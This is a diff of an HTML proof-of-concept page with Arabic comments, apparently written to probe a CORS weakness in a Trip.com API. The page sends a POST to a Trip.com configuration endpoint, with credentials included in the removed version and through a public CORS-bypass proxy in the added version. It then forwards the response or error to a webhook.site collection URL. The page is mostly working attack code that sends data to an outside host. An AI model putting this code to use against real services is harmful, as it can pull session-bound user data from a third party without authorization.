@@ -1,6 +1,4 @@
-]
-└─# cat index.html 
-k<!DOCTYPE html>
+<!DOCTYPE html>
 <html>
 <body>
 
@@ -13,10 +11,14 @@ k<!DOCTYPE html>
 // ===== رابط webhook.site لإرسال الرد إليه =====
 const TARGET_URL = "https://webhook.site/2bef5d8a-4a84-4ab7-8e71-ef2f512aa556";
 
-// ===== الطلب إلى Trip.com =====
-fetch("https://www.trip.com/restapi/soa2/24884/json/getConfiguration?url=https://omar.trip.com", {
+// ===== استخدم Proxy لتجاوز CORS =====
+const PROXY_URL = "https://api.allorigins.win/raw?url=";
+
+// ===== الطلب إلى Trip.com عبر Proxy =====
+const TRIP_API = "https://www.trip.com/restapi/soa2/24884/json/getConfiguration?url=https://omar.trip.com";
+
+fetch(PROXY_URL + encodeURIComponent(TRIP_API), {
     method: "POST",
-    credentials: "include",
     headers: {
         "Content-Type": "application/json"
     },
@@ -43,15 +45,15 @@ fetch("https://www.trip.com/restapi/soa2/24884/json/getConfiguration?url=https:/
     const status = r.status;
     const responseText = await r.text();
     
-    // عرض النتيجة في الصفحة (نفس الشيء)
+    // عرض النتيجة في الصفحة
     document.getElementById("result").textContent =
     "Status: " + status + "\n\n" + responseText;
     
     // ===== إرسال الرد إلى webhook.site =====
     try {
-        const forwardResponse = await fetch(TARGET_URL, {
+        await fetch(TARGET_URL, {
             method: "POST",
-            mode: 'no-cors',  // لتجنب مشاكل CORS
+            mode: 'no-cors',
             headers: {
                 "Content-Type": "application/json"
             },
@@ -64,14 +66,10 @@ fetch("https://www.trip.com/restapi/soa2/24884/json/getConfiguration?url=https:/
             })
         });
         
-        console.log("✅ تم إرسال الرد إلى webhook.site");
-        
-        // إضافة تأكيد في الصفحة
         document.getElementById("result").textContent += 
         "\n\n✅ تم إرسال البيانات إلى webhook.site";
         
     } catch(forwardError) {
-        console.error("❌ فشل إرسال الرد:", forwardError);
         document.getElementById("result").textContent += 
         "\n\n❌ فشل إرسال البيانات إلى webhook.site";
     }
@@ -82,7 +80,7 @@ fetch("https://www.trip.com/restapi/soa2/24884/json/getConfiguration?url=https:/
     document.getElementById("result").textContent =
     "Blocked:\n" + e;
     
-    // حتى الخطأ نرسله إلى webhook.site
+    // إرسال الخطأ إلى webhook.site
     try {
         fetch(TARGET_URL, {
             method: "POST",
@@ -96,7 +94,6 @@ fetch("https://www.trip.com/restapi/soa2/24884/json/getConfiguration?url=https:/
                 timestamp: new Date().toISOString()
             })
         });
-        console.log("✅ تم إرسال الخطأ إلى webhook.site");
     } catch(forwardError) {
         console.error("❌ فشل إرسال الخطأ:", forwardError);
     }
@@ -106,4 +103,3 @@ fetch("https://www.trip.com/restapi/soa2/24884/json/getConfiguration?url=https:/
 
 </body>
 </html>
-                                                      
